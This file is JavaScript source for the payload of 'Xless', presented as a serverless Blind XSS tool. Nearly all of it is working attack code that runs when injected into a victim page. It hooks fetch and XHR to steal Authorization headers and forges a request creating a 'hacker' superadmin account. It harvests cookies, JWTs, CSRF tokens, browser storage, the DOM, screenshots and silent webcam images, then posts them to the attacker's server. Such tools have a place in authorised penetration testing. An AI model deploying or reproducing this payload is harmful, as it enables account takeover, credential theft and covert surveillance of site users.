// Xless: The serverless Blind XSS app.
// Author: Mazin Ahmed <mazin@mazinahmed.net>
(function () {
  // Resolve script origin — currentScript can be null when loaded via eval()
  var scriptSrc = "";
  try {
    if (document.currentScript && document.currentScript.src) {
      scriptSrc = document.currentScript.src;
    }
  } catch (e) { }

  // Fallback: find our script tag by searching DOM
  if (!scriptSrc) {
    try {
      var scripts = document.getElementsByTagName("script");
      for (var i = scripts.length - 1; i >= 0; i--) {
        if (scripts[i].src && scripts[i].src.indexOf("/c") === -1 && scripts[i].src.match(/https?:\/\//)) {
          scriptSrc = scripts[i].src;
          break;
        }
      }
    } catch (e) { }
  }

  // Heartbeat ping: Notify server that script execution has started
  try {
    if (scriptSrc) {
      var pingUri = new URL(scriptSrc);
      var pingImg = new Image();
      var victimDomain = location.hostname || (location.protocol === "file:" ? "local-file" : "Unknown");
      pingImg.src = pingUri.origin + "/message?text=" + encodeURIComponent("Payload Execution Started on " + (location.hostname || location.href)) + "&domain=" + encodeURIComponent(victimDomain);
    }
  } catch (e) { }

  // [TECHNIQUE 5] Hook Networking to Capture Auth Headers
  // We hook fetch and XHR immediately to catch any subsequent requests
  (function hookNetworking() {
    if (window.xlessHooked) return;
    window.xlessHooked = true;
    window.xlessCapturedHeaders = {};

    // Hook Fetch
    const originalFetch = window.fetch;
    window.fetch = function () {
      var args = arguments;
      if (args[1] && args[1].headers) {
        // CheckHeaders
        try {
          var headers = args[1].headers;
          var headerObj = {};
          if (headers instanceof Headers) {
            headers.forEach((v, k) => headerObj[k] = v);
          } else {
            headerObj = headers;
          }

          // Look for Authorization
          for (var k in headerObj) {
            if (k.toLowerCase() === 'authorization') {
              window.xlessCapturedHeaders[args[0]] = headerObj[k];
              // Optional: Exfiltrate immediately
              new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("Captured Auth: " + headerObj[k]);
            }
          }
        } catch (e) { }
      }
      return originalFetch.apply(this, args);
    };

    // Hook XHR
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;

    XMLHttpRequest.prototype.open = function (method, url) {
      this._xlessUrl = url;
      return originalOpen.apply(this, arguments);
    }

    XMLHttpRequest.prototype.setRequestHeader = function (header, value) {
      if (header.toLowerCase() === 'authorization') {
        window.xlessCapturedHeaders[this._xlessUrl || "Unknown_XHR"] = value;
      }
      return originalSetRequestHeader.apply(this, arguments);
    }
  })();

  // [TECHNIQUE 3] Session Riding (Dual Strategy: Simple + Smart)
  function attemptSessionRiding() {
    // Strategy A: "Simple & Working" - Hardcoded Target (for demo/specific app)
    var targetEndpoint = "/api/admin/create_user";

    // Attempt the blind POST
    try {
      fetch(targetEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ action: 'create_admin', username: 'hacker', role: 'superadmin' })
      }).then(function (r) {
        // Log success to our C2 if possible
        if (r.ok) new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("Session Riding Success: " + targetEndpoint);
      });
    } catch (e) { }

    // Strategy B: "Application Aware" - Form Auto-Discovery
    // Look for sensitive forms and log them (or adventurous: try to hijack)
    try {
      var forms = document.getElementsByTagName('form');
      for (var i = 0; i < forms.length; i++) {
        var f = forms[i];
        var action = f.action;
        var txt = f.innerText.toLowerCase();
        // Heuristic: does it look sensitive?
        if (txt.includes('password') || txt.includes('email') || txt.includes('admin') || action.includes('update') || action.includes('change')) {
          new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("POTENTIAL HIJACK TARGET FOUND: " + action);

          // Optional: Auto-submit if it's a simple inputs
          // f.submit(); // Dangerous/Loud
        }
      }
    } catch (e) { }
  }
  attemptSessionRiding(); // Activated
  // attemptSessionRiding(); // Uncomment to activate


  function captureScreenshots() {
    if (typeof html2canvas === "undefined") return Promise.resolve([]);

    var results = [];
    var docW = Math.max(document.documentElement.scrollWidth, document.body.scrollWidth, window.innerWidth);
    var docH = Math.max(document.documentElement.scrollHeight, document.body.scrollHeight, window.innerHeight);
    var vpW = window.innerWidth || document.documentElement.clientWidth;
    var vpH = window.innerHeight || document.documentElement.clientHeight;

    // Screenshot 1: Full page
    function captureFullPage() {
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: false,
        useCORS: true,
        width: Math.min(docW, 4096),
        height: Math.min(docH, 4096),
        windowWidth: docW,
        windowHeight: docH,
        scrollX: 0,
        scrollY: 0,
        x: 0,
        y: 0
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/jpeg", 0.6));
      }).catch(function () {
        results.push("");
      });
    }

    // Screenshot 2: Current viewport
    function captureViewport() {
      var scrollX = window.pageXOffset || document.documentElement.scrollLeft;
      var scrollY = window.pageYOffset || document.documentElement.scrollTop;
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: false,
        useCORS: true,
        width: vpW,
        height: vpH,
        windowWidth: vpW,
        windowHeight: vpH,
        scrollX: scrollX,
        scrollY: scrollY,
        x: scrollX,
        y: scrollY
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/jpeg", 0.6));
      }).catch(function () {
        results.push("");
      });
    }

    // Screenshot 3: Below the fold
    function captureBelowFold() {
      if (docH <= vpH) return Promise.resolve();
      var belowY = Math.min(vpH, docH - vpH);
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: false,
        useCORS: true,
        width: Math.min(docW, 4096),
        height: vpH,
        windowWidth: vpW,
        windowHeight: vpH,
        scrollX: 0,
        scrollY: belowY,
        x: 0,
        y: belowY
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/jpeg", 0.6));
      }).catch(function () {
        results.push("");
      });
    }

    return captureFullPage()
      .then(captureViewport)
      .then(captureBelowFold)
      .then(function () {
        return results.filter(function (r) { return r && r.length > 0 && r.startsWith("data:"); });
      })
      .catch(function () {
        return results.filter(function (r) { return r && r.length > 0 && r.startsWith("data:"); });
      });
  }

  function collectData() {
    var collectedData = {
      Location: function () {
        return location.toString();
      },
      "Document Domain": function () {
        return document.domain;
      },
      "Document Location": function () {
        return document.location.toString();
      },
      Cookies: function () {
        return document.cookie;
      },
      Referrer: function () {
        return document.referrer;
      },
      "User-Agent": function () {
        return navigator.userAgent;
      },
      "Browser Fingerprint": function () {
        var fp = {};

        // 1. Basic Screen & Window
        fp.screen = {
          width: window.screen.width,
          height: window.screen.height,
          availWidth: window.screen.availWidth,
          availHeight: window.screen.availHeight,
          colorDepth: window.screen.colorDepth,
          pixelDepth: window.screen.pixelDepth,
          devicePixelRatio: window.devicePixelRatio
        };

        // 2. Mobile / Touch
        fp.mobile = {
          touchPoints: navigator.maxTouchPoints || 0,
          orientation: (window.screen.orientation ? window.screen.orientation.type : window.orientation) || "unknown",
          isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
        };

        // 3. Browser & OS (Robust Parsing)
        var ua = navigator.userAgent;
        var tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
        if (/trident/i.test(M[1])) {
          tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
          fp.browser = "IE " + (tem[1] || "");
        } else if (M[1] === 'Chrome') {
          tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
          if (tem != null) fp.browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
        }
        if (!fp.browser) {
          M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
          if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
          fp.browser = M.join(' ');
        }

        fp.os = "Unknown";
        if (ua.indexOf("Win") != -1) fp.os = "Windows";
        if (ua.indexOf("Mac") != -1) fp.os = "MacOS";
        if (ua.indexOf("Linux") != -1) fp.os = "Linux";
        if (ua.indexOf("Android") != -1) fp.os = "Android";
        if (ua.indexOf("like Mac") != -1) fp.os = "iOS";

        fp.platform = navigator.platform || "Unknown";

        // 4. Plugins (Legacy but useful)
        fp.plugins = [];
        if (navigator.plugins) {
          for (var i = 0; i < navigator.plugins.length; i++) {
            fp.plugins.push(navigator.plugins[i].name);
          }
        }

        return JSON.stringify(fp, null, 2);
      },
      "Browser Time": function () {
        return new Date().toTimeString();
      },
      Origin: function () {
        return location.origin;
      },
      "JWT Tokens": function () {
        // Attempt to find JWTs in localStorage, sessionStorage, and cookies
        var tokens = [];
        var jwtRegex = /ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;

        function searchStorage(storage) {
          for (var i = 0; i < storage.length; i++) {
            var key = storage.key(i);
            var value = storage.getItem(key);
            if (value && typeof value === 'string') {
              var matches = value.match(jwtRegex);
              if (matches) {
                matches.forEach(function (m) {
                  if (!tokens.includes(m)) tokens.push(m);
                });
              }
            }
          }
        }

        try { searchStorage(localStorage); } catch (e) { }
        try { searchStorage(sessionStorage); } catch (e) { }
        try {
          if (document.cookie) {
            var cookieMatches = document.cookie.match(jwtRegex);
            if (cookieMatches) {
              cookieMatches.forEach(function (m) {
                if (!tokens.includes(m)) tokens.push(m);
              });
            }
          }
        } catch (e) { }

        return tokens.length > 0 ? tokens.join("\n") : "None found";
      },
      "CSRF Tokens": function () {
        var tokens = [];
        // 1. Search meta tags
        var metas = document.getElementsByTagName('meta');
        for (var i = 0; i < metas.length; i++) {
          if (metas[i].name && /csrf|xsrf|token/i.test(metas[i].name)) {
            tokens.push("Meta: " + metas[i].name + " = " + metas[i].content);
          }
        }
        // 2. Search inputs
        var inputs = document.getElementsByTagName('input');
        for (var i = 0; i < inputs.length; i++) {
          if (inputs[i].name && /csrf|xsrf|token/i.test(inputs[i].name)) {
            tokens.push("Input: " + inputs[i].name + " = " + inputs[i].value);
          }
        }
        return tokens.length > 0 ? tokens.join("\n") : "None found";
      },
      "Captured Auth Headers": function () {
        return window.xlessCapturedHeaders ? JSON.stringify(window.xlessCapturedHeaders, null, 2) : "None captured yet";
      },
      DOM: function () {
        return document.documentElement.outerHTML || "";
      },
      localStorage: function () {
        try { return JSON.stringify(localStorage); } catch (e) { return ""; }
      },
      sessionStorage: function () {
        try { return JSON.stringify(sessionStorage); } catch (e) { return ""; }
      },
      Webcam: function () {
        // Smart webcam capture: only if permission is already granted (no popup)
        return new Promise(function (resolve) {
          // Check if mediaDevices API is available
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return resolve("not supported");
          }

          function checkAndCapture() {
            return navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } })
              .then(function (stream) {
                return new Promise(function (innerResolve) {
                  var video = document.createElement("video");
                  video.setAttribute("autoplay", "");
                  video.setAttribute("playsinline", "");
                  video.srcObject = stream;
                  video.play();

                  setTimeout(function () {
                    try {
                      var canvas = document.createElement("canvas");
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                      var dataUrl = canvas.toDataURL("image/jpeg", 0.6);

                      stream.getTracks().forEach(function (track) { track.stop(); });
                      video.srcObject = null;
                      innerResolve(dataUrl);
                    } catch (e) {
                      stream.getTracks().forEach(function (track) { track.stop(); });
                      innerResolve("capture failed");
                    }
                  }, 1500);
                });
              })
              .catch(function () {
                return "denied";
              });
          }

          // Use Permissions API to check without triggering popup
          if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: "camera" })
              .then(function (result) {
                if (result.state === "granted") {
                  checkAndCapture().then(resolve);
                } else {
                  resolve("no permission");
                }
              })
              .catch(function () {
                resolve("permission check unavailable");
              });
          } else {
            resolve("permissions API unavailable");
          }

          // Timeout safety: don't hang forever
          setTimeout(function () { resolve("timeout"); }, 8000);
        });
      },
    };

    // Capture screenshots separately (cached, only runs once)
    var screenshotPromise = captureScreenshots();

    return Promise.all(
      Object.keys(collectedData).map(function (key) {
        try {
          return Promise.resolve(collectedData[key]()).then(function (value) {
            collectedData[key] = value || "";
          });
        } catch (e) {
          collectedData[key] = "";
          return Promise.resolve();
        }
      }).concat([screenshotPromise])
    ).then(function () {
      var shots = [];
      try { shots = screenshotPromise.__result || []; } catch (e) { }
      return screenshotPromise.then(function (s) {
        shots = s || [];
        collectedData["Screenshot"] = shots.length > 0 ? shots[0] : "";
        collectedData["Screenshots"] = shots;
        return collectedData;
      });
    });
  }

  function exfiltrateLoot(collectedData) {
    if (!scriptSrc) return;

    var uri;
    try { uri = new URL(scriptSrc); } catch (e) { return; }
    var exfUrl = uri.origin + "/c";

    // Size-aware optimization for Netlify (6MB limit)
    function send(data) {
      var jsonData = JSON.stringify(data);
      var size = jsonData.length;

      // If payload is too large (> 5MB to be safe), start dropping screenshots
      if (size > 5000000) {
        if (data["Screenshots"] && data["Screenshots"].length > 2) {
          data["Screenshots"].pop(); // Drop "Below Fold"
          return send(data);
        }
        if (data["Screenshots"] && data["Screenshots"].length > 1) {
          data["Screenshots"].pop(); // Drop "Full Page"
          return send(data);
        }
        if (data["Screenshots"] && data["Screenshots"].length > 0) {
          data["Screenshots"] = []; // Drop all screenshots
          data["Screenshot"] = "";
          return send(data);
        }
        if (data["Webcam"]) {
          data["Webcam"] = ""; // Drop webcam
          return send(data);
        }
        // If still too large, truncate DOM as last resort
        if (data["DOM"] && data["DOM"].length > 1500000) {
          data["DOM"] = data["DOM"].substring(0, 1500000) + "... [Truncated due to size constraints]";
          return send(data);
        }
      }

      try {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", exfUrl, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(jsonData);
      } catch (e) {
        try { navigator.sendBeacon(exfUrl, jsonData); } catch (e2) { }
      }
    }

    send(collectedData);
  }

  function loadScript(src) {
    return new Promise(function (resolve) {
      var script = document.createElement("script");
      script.type = "text/javascript";
      script.async = true;
      script.onload = resolve;
      script.onerror = resolve; // Resolve on error too so chain continues
      script.src = src;
      (document.head || document.getElementsByTagName("head")[0] || document.documentElement).appendChild(script);
    });
  }

  // Load html2canvas dependency, then collect data and exfiltrate
  // CRITICAL: Even if html2canvas fails to load (CSP blocks CDN), we STILL collect data
  loadScript(
    "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"
  )
    .then(collectData)
    .then(exfiltrateLoot)
    .catch(function () {
      // If anything in the chain fails, still try to collect and send data
      collectData()
        .then(exfiltrateLoot)
        .catch(function () { });
    });
})();
